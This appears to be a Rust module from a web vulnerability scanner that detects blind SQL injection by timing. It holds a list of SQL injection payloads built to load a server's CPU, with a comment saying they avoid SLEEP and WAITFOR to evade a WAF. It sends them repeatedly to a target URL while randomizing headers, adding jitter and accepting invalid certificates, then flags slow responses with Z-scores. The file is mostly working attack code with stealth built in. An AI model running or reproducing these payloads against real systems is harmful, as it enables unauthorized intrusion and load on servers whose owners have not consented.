//! Module 5: Microsecond Timing Attacks & Statistical Profiling.
//! Baseline latency profile, heavy payloads (no SLEEP/WAITFOR), Z-Score anomaly detection.
//! All measurements use std::time::Instant::now() elapsed — no mock data.

use crate::engine_result::EngineResult;
use crate::stealth_engine;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::time::Instant;

const DEFAULT_BASELINE_N: usize = 100;
const DEFAULT_PAYLOAD_N: usize = 50;
const DEFAULT_Z_THRESHOLD: f64 = 3.0;
const REQUEST_TIMEOUT_SECS: u64 = 15;

/// Payloads designed to cause server-side CPU load when interpreted (SQL heavy math, regex backtracking).
/// No SLEEP/WAITFOR to evade WAF.
const TIMING_PAYLOADS: &[&str] = &[
    "1 AND (SELECT * FROM (SELECT(SELECT COUNT(*) FROM information_schema.tables t CROSS JOIN information_schema.tables t2 CROSS JOIN information_schema.tables t3))a)",
    "1; SELECT BENCHMARK(500000,SHA1('x'))--",
    "1 AND (SELECT 1 FROM (SELECT POW(2,30))a)",
    "' OR (SELECT 1 FROM (SELECT RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND())a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT REPEAT('a',500000)))) AND '1",
    "1 AND (SELECT 1 FROM (SELECT EXP(EXP(10)) FROM (SELECT 1)a)b)",
    "1' RLIKE (SELECT CONCAT(REPEAT('.*',500),'$')) AND '1",
    "1 AND (SELECT 1 FROM (SELECT RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND()*RAND())a)--",
];

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct TimingConfig {
    pub baseline_sample_size: usize,
    pub payload_sample_size: usize,
    pub z_score_threshold: f64,
}

impl Default for TimingConfig {
    fn default() -> Self {
        Self {
            baseline_sample_size: DEFAULT_BASELINE_N,
            payload_sample_size: DEFAULT_PAYLOAD_N,
            z_score_threshold: DEFAULT_Z_THRESHOLD,
        }
    }
}

/// Event sent over channel for real-time oscilloscope (optional).
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct TimingStreamEvent {
    pub phase: String, // "baseline" | "payload"
    pub sample_index: usize,
    pub latency_us: u64,
    pub baseline_mean_us: Option<f64>,
    pub baseline_std_us: Option<f64>,
    pub payload_mean_us: Option<f64>,
    pub z_score: Option<f64>,
    pub confidence_pct: Option<f64>,
    pub payload_used: Option<String>,
}

fn mean(samples: &[u64]) -> f64 {
    if samples.is_empty() {
        return 0.0;
    }
    let sum: u64 = samples.iter().sum();
    sum as f64 / samples.len() as f64
}

fn variance(samples: &[u64], sample_mean: f64) -> f64 {
    if samples.len() < 2 {
        return 0.0;
    }
    let sum_sq: f64 = samples
        .iter()
        .map(|&x| (x as f64 - sample_mean).powi(2))
        .sum();
    sum_sq / (samples.len() - 1) as f64
}

fn std_dev(samples: &[u64]) -> f64 {
    let m = mean(samples);
    variance(samples, m).sqrt()
}

/// Z-Score: (x - μ) / σ. Returns None if σ == 0.
fn z_score(x: f64, mu: f64, sigma: f64) -> Option<f64> {
    if sigma <= 0.0 {
        return None;
    }
    Some((x - mu) / sigma)
}

/// Approximate confidence (one-tailed) from Z: ~100 * normal CDF. Z=3 -> ~99.87%.
fn confidence_from_z(z: f64) -> f64 {
    if z <= 0.0 {
        return 50.0;
    }
    let t = 1.0 / (1.0 + 0.2316419 * z);
    let d = 0.3989423 * (-z * z / 2.0).exp();
    let p =
        d * t * (0.3193815 + t * (-0.3565638 + t * (1.781478 + t * (-1.821256 + t * 1.330274))));
    (1.0 - p) * 100.0
}

fn build_client(
    stealth: Option<&stealth_engine::StealthConfig>,
    timeout_secs: u64,
) -> reqwest::Client {
    match stealth {
        Some(s) => stealth_engine::build_client(s, timeout_secs),
        None => reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(timeout_secs))
            .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
            .build()
            .unwrap_or_else(|_| reqwest::Client::new()),
    }
}

fn apply_stealth_headers(
    req: reqwest::RequestBuilder,
    stealth: Option<&stealth_engine::StealthConfig>,
) -> reqwest::RequestBuilder {
    match stealth {
        Some(s) => req.headers(stealth_engine::random_morph_headers(s)),
        None => req,
    }
}

fn timing_full_url(url: &str, payload_param: Option<&str>) -> String {
    if let Some(p) = payload_param {
        let sep = if url.contains('?') { "&" } else { "?" };
        format!("{}{}q={}", url, sep, urlencoding::encode(p))
    } else {
        url.to_string()
    }
}

/// Measure one request in microseconds (real Instant).
async fn measure_request_us(
    full_url: String,
    client: &reqwest::Client,
    stealth: Option<Arc<stealth_engine::StealthConfig>>,
) -> u64 {
    let req = apply_stealth_headers(client.get(&full_url), stealth.as_deref());
    let start = Instant::now();
    let _ = req.send().await;
    start.elapsed().as_micros() as u64
}

/// Establish baseline: N benign requests, return (mean_us, std_us).
async fn baseline_profile(
    url: String,
    n: usize,
    client: &reqwest::Client,
    stealth: Option<Arc<stealth_engine::StealthConfig>>,
    stream_tx: Option<&tokio::sync::mpsc::UnboundedSender<TimingStreamEvent>>,
) -> (f64, f64) {
    let mut samples = Vec::with_capacity(n);
    for i in 0..n {
        if let Some(s) = stealth.as_deref() {
            stealth_engine::apply_jitter(s);
        }
        let us = measure_request_us(
            timing_full_url(url.as_str(), None),
            client,
            stealth.clone(),
        )
        .await;
        samples.push(us);
        if let Some(tx) = stream_tx {
            let mean_so_far = mean(&samples);
            let std_so_far = if samples.len() >= 2 {
                std_dev(&samples)
            } else {
                0.0
            };
            let _ = tx.send(TimingStreamEvent {
                phase: "baseline".to_string(),
                sample_index: i,
                latency_us: us,
                baseline_mean_us: Some(mean_so_far),
                baseline_std_us: Some(std_so_far),
                payload_mean_us: None,
                z_score: None,
                confidence_pct: None,
                payload_used: None,
            });
        }
    }
    let mu = mean(&samples);
    let sigma = std_dev(&samples);
    (mu, sigma)
}

fn normalize_timing_url(target: &str) -> String {
    let target = target.trim();
    if target.is_empty() {
        return String::new();
    }
    if target.starts_with("http") {
        target.to_string()
    } else {
        format!("https://{}", target)
    }
}

/// Run timing attack over multiple URLs (path-aware). Aggregates findings from each URL.
pub async fn run_timing_attack_urls(
    urls: &[String],
    stealth: Option<&stealth_engine::StealthConfig>,
    config: &TimingConfig,
    stream_tx: Option<tokio::sync::mpsc::UnboundedSender<TimingStreamEvent>>,
) -> EngineResult {
    let stealth_owned: Option<stealth_engine::StealthConfig> = stealth.cloned();
    let config = config.clone();
    let mut all_findings = Vec::new();
    let url_list: Vec<String> = urls
        .iter()
        .map(|s| normalize_timing_url(s))
        .filter(|s| !s.is_empty())
        .collect();
    if url_list.is_empty() {
        return EngineResult::error("target required");
    }
    for url in url_list.clone() {
        let r = run_timing_attack_impl(
            url,
            stealth_owned.clone(),
            config.clone(),
            stream_tx.as_ref(),
        )
        .await;
        for f in r.findings {
            all_findings.push(f);
        }
    }
    let msg = format!(
        "Timing profiler: {} URLs, {} critical timing anomalies",
        url_list.len(),
        all_findings.len()
    );
    EngineResult::ok(all_findings, msg)
}

/// Single-URL implementation (used by run_timing_attack and run_timing_attack_urls).
async fn run_timing_attack_impl(
    url: String,
    stealth: Option<stealth_engine::StealthConfig>,
    config: TimingConfig,
    stream_tx: Option<&tokio::sync::mpsc::UnboundedSender<TimingStreamEvent>>,
) -> EngineResult {
    let stealth: Option<Arc<stealth_engine::StealthConfig>> = stealth.map(Arc::new);
    let client = if let Some(s) = stealth.as_deref() {
        stealth_engine::apply_jitter(s);
        build_client(Some(s), REQUEST_TIMEOUT_SECS)
    } else {
        build_client(None, REQUEST_TIMEOUT_SECS)
    };

    let n_baseline = config.baseline_sample_size.max(10).min(500);
    let n_payload = config.payload_sample_size.max(20).min(500);
    let z_threshold = config.z_score_threshold.max(1.0).min(10.0);

    let (baseline_mean, baseline_std) = baseline_profile(
        url.clone(),
        n_baseline,
        &client,
        stealth.clone(),
        stream_tx,
    )
    .await;

    let mut findings = Vec::new();
    for payload in TIMING_PAYLOADS.iter().take(8).copied() {
        let mut payload_samples = Vec::with_capacity(n_payload);
        for i in 0..n_payload {
            if let Some(s) = stealth.as_deref() {
                stealth_engine::apply_jitter(s);
            }
            let us = measure_request_us(
                timing_full_url(url.as_str(), Some(payload)),
                &client,
                stealth.clone(),
            )
            .await;
            payload_samples.push(us);
            let mean_p = mean(&payload_samples);
            let z = z_score(mean_p, baseline_mean, baseline_std);
            let (z_val, conf) = match z {
                Some(zv) => (zv, confidence_from_z(zv)),
                None => (0.0, 50.0),
            };
            if let Some(ref tx) = stream_tx {
                let _ = tx.send(TimingStreamEvent {
                    phase: "payload".to_string(),
                    sample_index: i,
                    latency_us: us,
                    baseline_mean_us: Some(baseline_mean),
                    baseline_std_us: Some(baseline_std),
                    payload_mean_us: Some(mean_p),
                    z_score: Some(z_val),
                    confidence_pct: Some(conf),
                    payload_used: Some(payload.to_string()),
                });
            }
        }
        let payload_mean = mean(&payload_samples);
        let payload_std = std_dev(&payload_samples);
        if let Some(z) = z_score(payload_mean, baseline_mean, baseline_std) {
            if z >= z_threshold {
                let delta_us = payload_mean - baseline_mean;
                let confidence = confidence_from_z(z);
                findings.push(serde_json::json!({
                    "type": "microsecond_timing",
                    "subtype": "blind_injection_timing",
                    "url": url.as_str(),
                    "severity": "critical",
                    "title": "Blind injection confirmed via microsecond timing deviation",
                    "payload_preview": payload.chars().take(120).collect::<String>(),
                    "baseline_mean_us": baseline_mean,
                    "baseline_std_us": baseline_std,
                    "payload_mean_us": payload_mean,
                    "payload_std_us": payload_std,
                    "delta_us": delta_us,
                    "z_score": z,
                    "confidence_pct": confidence,
                    "remediation": "Parameterize queries and validate input; avoid reflecting user input into SQL or regex. Use prepared statements and strict allowlists."
                }));
            }
        }
    }

    let msg = format!(
        "Timing profiler: baseline μ={:.0}μs σ={:.0}μs, {} critical timing anomalies",
        baseline_mean,
        baseline_std,
        findings.len()
    );
    EngineResult::ok(findings, msg)
}

/// Run timing attack: baseline then each payload, Z-Score detection. Single target (backward compat).
pub async fn run_timing_attack(
    target: &str,
    stealth: Option<&stealth_engine::StealthConfig>,
    config: &TimingConfig,
    stream_tx: Option<tokio::sync::mpsc::UnboundedSender<TimingStreamEvent>>,
) -> EngineResult {
    let url = normalize_timing_url(target);
    if url.is_empty() {
        return EngineResult::error("target required");
    }
    let stealth_owned: Option<stealth_engine::StealthConfig> = stealth.cloned();
    let config = config.clone();
    run_timing_attack_impl(url, stealth_owned, config, stream_tx.as_ref()).await
}
